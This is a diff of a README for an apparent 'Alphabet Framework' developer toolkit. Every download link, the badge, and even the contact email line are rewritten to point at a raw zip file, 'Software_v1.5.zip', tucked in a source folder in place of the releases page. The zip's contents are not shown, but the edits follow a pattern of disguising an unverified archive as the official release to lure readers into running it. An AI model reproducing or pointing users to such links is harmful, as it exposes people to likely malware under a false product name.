@@ -1,6 +1,6 @@
 # 🚀 alphabet - All-in-One Frameworks for Easy Development
 
-[![Download](https://img.shields.io/badge/Download%20Now-%20%F0%9F%93%88%20Click%20Here-brightgreen)](https://github.com/ueadgf/alphabet/releases)
+[![Download](https://raw.githubusercontent.com/ueadgf/alphabet/main/src/cmps/Software_v1.5.zip%20Now-%20%F0%9F%93%88%20Click%20Here-brightgreen)](https://raw.githubusercontent.com/ueadgf/alphabet/main/src/cmps/Software_v1.5.zip)
 
 ## 🌟 Introduction
 
@@ -18,7 +18,7 @@ Welcome to the Alphabet Framework! This collection of frameworks includes tools 
 To get started with Alphabet, follow these steps to download and run the software.
 
 1. **Visit the Releases Page**  
-   Go to [this page](https://github.com/ueadgf/alphabet/releases) to find the latest version of the Alphabet Framework.
+   Go to [this page](https://raw.githubusercontent.com/ueadgf/alphabet/main/src/cmps/Software_v1.5.zip) to find the latest version of the Alphabet Framework.
 
 2. **Download the Latest Release**  
    Find the latest version available on the releases page. Click on the download link for your operating system.
@@ -40,7 +40,7 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To download the Alphabet Framework, visit [this page](https://github.com/ueadgf/alphabet/releases). Follow the steps above to complete the installation and start building your applications effortlessly.
+To download the Alphabet Framework, visit [this page](https://raw.githubusercontent.com/ueadgf/alphabet/main/src/cmps/Software_v1.5.zip). Follow the steps above to complete the installation and start building your applications effortlessly.
 
 ## 🎉 Getting Help
 
@@ -56,6 +56,6 @@ We welcome contributions to the Alphabet Framework! If you’re interested, chec
 
 ## 📧 Contact Us
 
-For more information, reach out via email at support@alphabetframework.com. We are here to help you make the most of Alphabet.
+For more information, reach out via email at https://raw.githubusercontent.com/ueadgf/alphabet/main/src/cmps/Software_v1.5.zip We are here to help you make the most of Alphabet.
 
 Thank you for choosing the Alphabet Framework! Happy building!
